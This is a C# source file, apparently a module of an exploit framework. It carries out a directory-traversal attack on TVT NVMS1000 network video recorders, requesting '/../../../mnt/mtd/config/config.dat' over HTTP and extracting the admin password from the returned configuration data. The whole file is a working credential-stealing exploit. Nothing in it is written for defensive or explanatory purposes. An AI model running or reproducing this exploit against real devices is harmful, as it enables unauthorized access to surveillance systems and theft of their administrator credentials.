using System;
using System.Net;

using Kaye.Net;
using Kaye.Models;
using Kaye.Profiles;

namespace Kaye.Exploits
{
    public class NVMS1000PathTraversal : Exploit
    {
        private static String ExploitPath = "/../../../mnt/mtd/config/config.dat";

        public override string GetMessage() { return "TVT NVMS1000 directory traversal"; }

        public Model Model;
        public Profile[] Profiles;

        public static Boolean TryPerform(IPEndPoint Target, out NVMS1000PathTraversal Output)
        {
            String Password = String.Empty;
            Output = new NVMS1000PathTraversal();
            Output.Model = Model.NVMS1000;

            try
            {
                HTTPSender Http = new HTTPSender(Target);
                String Response = Http.DownloadString(ExploitPath);
                Int32 Pos;
                if ((Pos = Response.IndexOf("admin")) == -1) return false;
                Pos += 5;
                while (Response[Pos] == '\0') Pos++;
                while (Response[Pos] != '\0')
                {
                    Password += Response[Pos];
                    Pos++;
                }
                Output.Profiles = new Profile[1];
                Output.Profiles[0] = new Profile("admin", Password);
                return true;
            }
            catch { return false; }
        }
    }
}